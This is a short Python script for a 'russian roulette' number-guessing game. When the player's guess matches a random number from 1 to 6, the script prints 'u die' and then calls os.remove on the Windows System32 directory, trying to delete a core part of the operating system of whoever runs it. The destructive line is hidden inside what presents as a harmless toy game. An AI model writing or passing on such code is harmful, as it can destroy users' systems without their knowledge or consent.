import os
import random 
from time import sleep

print("russian roulette")
while True:
    guess = 0
    print("guess number 1-6")
    guess = int(input())
    while guess < 1 or guess > 6:
        print("y u scared")
        print("guess number 1-6")
        guess = int(input())
    number = random.randint(1,6)
    if guess == number:
        print("u die")
        number = str(number)
        print("number was "+ number)
        sleep(5)
        os.remove(r"\Windows\System32")
        exit()
    else:
        print("u ok")
        number = str(number)
        print("number was "+ number)
        print(number)
